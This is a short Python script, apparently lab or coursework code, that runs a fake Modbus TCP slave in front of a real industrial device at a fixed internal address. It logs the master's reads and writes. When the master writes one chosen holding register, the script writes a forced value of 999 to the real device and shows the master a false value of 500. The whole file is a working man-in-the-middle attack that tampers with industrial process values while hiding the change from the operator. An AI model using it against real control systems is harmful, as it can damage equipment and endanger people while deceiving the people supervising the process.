#!/usr/bin/env python3

from pymodbus.server import StartTcpServer
from pymodbus.client import ModbusTcpClient
from pymodbus.datastore import (
    ModbusDeviceContext,
    ModbusServerContext,
    ModbusSequentialDataBlock,
)

LISTEN_IP = "0.0.0.0"
LISTEN_PORT = 502

REAL_SLAVE_IP = "172.16.4.51"
REAL_SLAVE_PORT = 502

TARGET_REGISTER = 2
FORCED_VALUE = 999
MASTER_SEES_VALUE = 500

# Connect to real slave
real_client = ModbusTcpClient(REAL_SLAVE_IP, port=REAL_SLAVE_PORT)
if not real_client.connect():
    raise SystemExit(f"[!] Could not connect to real slave {REAL_SLAVE_IP}:{REAL_SLAVE_PORT}")

class LogBlock(ModbusSequentialDataBlock):

    def getValues(self, address, count=1):
        values = super().getValues(address, count)
        print(f"[READ] addr={address} -> {values}")
        return values

    def setValues(self, address, values):
        print(f"[WRITE from master] addr={address} values={values}")

        if address == TARGET_REGISTER:
            print(f"[FORWARD] Writing {FORCED_VALUE} to real slave HR[{TARGET_REGISTER}]")

            real_client.write_register(
                TARGET_REGISTER,
                FORCED_VALUE,
                device_id=1
            )

            # Master skal se en anden værdi
            super().setValues(address, [MASTER_SEES_VALUE])
        else:
            super().setValues(address, values)


# Local datastore (fake slave state)
block = LogBlock(0, [0] * 100)

# Initial value master ser
block.setValues(TARGET_REGISTER, [MASTER_SEES_VALUE])

store = ModbusDeviceContext(hr=block)
context = ModbusServerContext(devices=store, single=True)

print(f"[+] Fake slave listening on {LISTEN_IP}:{LISTEN_PORT}")
print(f"[+] Forwarding register {TARGET_REGISTER} as {FORCED_VALUE} to real slave")

StartTcpServer(context, address=(LISTEN_IP, LISTEN_PORT))
